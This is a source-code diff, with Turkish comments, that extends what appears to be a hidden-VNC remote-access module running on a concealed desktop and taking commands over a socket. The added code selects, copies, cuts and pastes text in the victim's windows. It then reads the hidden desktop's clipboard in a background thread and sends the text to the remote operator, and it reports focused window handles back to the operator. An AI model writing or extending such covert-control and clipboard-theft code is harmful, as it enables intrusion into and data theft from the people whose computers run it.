@@ -916,6 +916,75 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
 
 // -----------------------------------------------------------------------
 //  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
+static wstring utf8_to_wstring(const string& str) {
+    if (str.empty()) return wstring();
+    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
+    if (size <= 0) return wstring();
+    wstring res(size, 0);
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
+    if (!res.empty() && res.back() == L'\0') res.pop_back();
+    return res;
+}
+
+static string wstring_to_utf8(const wstring& wstr) {
+    if (wstr.empty()) return string();
+    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return string();
+    string res(size, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
+    if (!res.empty() && res.back() == '\0') res.pop_back();
+    return res;
+}
+
+static void SetClipboardText(const wstring& text) {
+    if (!OpenClipboard(NULL)) return;
+    EmptyClipboard();
+    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.size() + 1) * sizeof(wchar_t));
+    if (hGlob) {
+        wchar_t* pBuf = (wchar_t*)GlobalLock(hGlob);
+        if (pBuf) {
+            wcscpy(pBuf, text.c_str());
+            GlobalUnlock(hGlob);
+            SetClipboardData(CF_UNICODETEXT, hGlob);
+        }
+    }
+    CloseClipboard();
+}
+
+static wstring GetClipboardText() {
+    wstring res;
+    if (!OpenClipboard(NULL)) return res;
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData) {
+        wchar_t* pBuf = (wchar_t*)GlobalLock(hData);
+        if (pBuf) {
+            res = pBuf;
+            GlobalUnlock(hData);
+        }
+    }
+    CloseClipboard();
+    return res;
+}
+
+static void SendShortcut(HWND hTarget, WPARAM vk, UINT highLevelMsg = 0, WPARAM highLevelWParam = 0) {
+    if (!hTarget || !IsWindow(hTarget)) return;
+
+    PostMessageW(hTarget, WM_KEYDOWN, VK_CONTROL, key_lparam(VK_CONTROL, false));
+    Sleep(20);
+
+    if (highLevelMsg != 0) {
+        SendMessageTimeoutW(hTarget, highLevelMsg, highLevelWParam, 0, SMTO_ABORTIFHUNG, 100, NULL);
+        Sleep(20);
+    }
+
+    PostMessageW(hTarget, WM_KEYDOWN, vk, key_lparam((WORD)vk, false));
+    Sleep(20);
+    PostMessageW(hTarget, WM_KEYUP, vk, key_lparam((WORD)vk, true));
+    Sleep(20);
+
+    PostMessageW(hTarget, WM_KEYUP, VK_CONTROL, key_lparam(VK_CONTROL, true));
+}
+
 // -----------------------------------------------------------------------
 static HWND GetFocusedWindow() {
     HWND hTarget = g_hCurrentFocus;
@@ -954,9 +1023,22 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
-        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
+        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char" ||
+            action == "hvnc_selectall" || action == "hvnc_copy" || action == "hvnc_cut" ||
+            action == "hvnc_paste" || action == "hvnc_clipboard") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = WindowFromPoint(g_lastMousePos);
+            HWND hTarget = NULL;
+            if (cmd.contains("focused_hwnd")) {
+                try {
+                    auto& val = cmd["focused_hwnd"];
+                    if (val.is_number()) {
+                        hTarget = (HWND)(uintptr_t)val.get<uint64_t>();
+                    } else if (val.is_string()) {
+                        hTarget = (HWND)(uintptr_t)stoull(val.get<string>());
+                    }
+                } catch (...) {}
+            }
+            if (!hTarget || !IsWindow(hTarget)) hTarget = WindowFromPoint(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
@@ -966,6 +1048,42 @@ static void input_loop() {
                 PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
                 PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+            } else if (action == "hvnc_selectall") {
+                // Try standard Edit select all
+                SendMessageTimeoutW(hTarget, EM_SETSEL, 0, -1, SMTO_ABORTIFHUNG, 200, NULL);
+                // Try WM_COMMAND select all (standard for many apps)
+                SendShortcut(hTarget, 'A', WM_COMMAND, 0xE122);
+            } else if (action == "hvnc_copy" || action == "hvnc_cut") {
+                UINT msg = (action == "hvnc_copy") ? WM_COPY : WM_CUT;
+                WPARAM vk_key = (action == "hvnc_copy") ? 'C' : 'X';
+                SendShortcut(hTarget, vk_key, msg, 0);
+
+                thread([]() {
+                    Sleep(500);
+                    HDESK hHidden = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
+                    if (hHidden) {
+                        SetThreadDesktop(hHidden);
+                        wstring text = GetClipboardText();
+                        if (!text.empty()) {
+                            json resp;
+                            resp["action"] = "hvnc_clipboard";
+                            resp["text"] = wstring_to_utf8(text);
+                            safe_send_json(g_socket, resp);
+                        }
+                        CloseDesktop(hHidden);
+                    }
+                }).detach();
+            } else if (action == "hvnc_paste") {
+                string text = cmd.value("text", "");
+                if (!text.empty()) {
+                    SetClipboardText(utf8_to_wstring(text));
+                }
+                SendShortcut(hTarget, 'V', WM_PASTE, 0);
+            } else if (action == "hvnc_clipboard") {
+                string text = cmd.value("text", "");
+                if (!text.empty()) {
+                    SetClipboardText(utf8_to_wstring(text));
+                }
             }
             g_forceFullFrame = true;
             continue;
@@ -1051,6 +1169,11 @@ static void input_loop() {
             if (!hwnd) hwnd = WindowFromPoint(screenPt);
 
             if (hwnd) {
+                json ack;
+                ack["action"] = "hvnc_focus";
+                ack["hwnd"] = to_string((uintptr_t)hwnd);
+                safe_send_json(g_socket, ack);
+
                 LRESULT ht = HTCLIENT;
                 SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                     SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
@@ -1092,8 +1215,8 @@ static void input_loop() {
 
                 SetCursorPos(screenPt.x, screenPt.y);
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
-                PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
                 PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
+                PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
             }
             continue;
         }
@@ -1115,6 +1238,11 @@ static void input_loop() {
             if (!hwnd) hwnd = WindowFromPoint(screenPt);
 
             if (hwnd) {
+                json ack;
+                ack["action"] = "hvnc_focus";
+                ack["hwnd"] = to_string((uintptr_t)hwnd);
+                safe_send_json(g_socket, ack);
+
                 LRESULT ht = HTCLIENT;
                 SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                     SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
@@ -1141,6 +1269,11 @@ static void input_loop() {
             if (!hwnd) hwnd = WindowFromPoint(screenPt);
 
             if (hwnd) {
+                json ack;
+                ack["action"] = "hvnc_focus";
+                ack["hwnd"] = to_string((uintptr_t)hwnd);
+                safe_send_json(g_socket, ack);
+
                 LRESULT ht = HTCLIENT;
                 SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                     SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
@@ -1168,26 +1301,6 @@ static void input_loop() {
             continue;
         }
     }
-}
-
-static wstring utf8_to_wstring(const string& str) {
-    if (str.empty()) return wstring();
-    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
-    if (size <= 0) return wstring();
-    wstring res(size, 0);
-    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
-    if (!res.empty() && res.back() == L'\0') res.pop_back();
-    return res;
-}
-
-static string wstring_to_utf8(const wstring& wstr) {
-    if (wstr.empty()) return string();
-    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
-    if (size <= 0) return string();
-    string res(size, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
-    if (!res.empty() && res.back() == '\0') res.pop_back();
-    return res;
 }
 
 static wstring get_app_path(const wstring& appName) {
@@ -1467,7 +1580,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
                    action == "hvnc_char" ||
-                   action == "hvnc_doubleclick") {
+                   action == "hvnc_doubleclick" ||
+                   action == "hvnc_selectall" ||
+                   action == "hvnc_copy" ||
+                   action == "hvnc_cut" ||
+                   action == "hvnc_paste" ||
+                   action == "hvnc_clipboard") {
             lock_guard<mutex> lock(g_inputMutex);
             g_inputQueue.push({action, cmd});
             g_inputCV.notify_one();
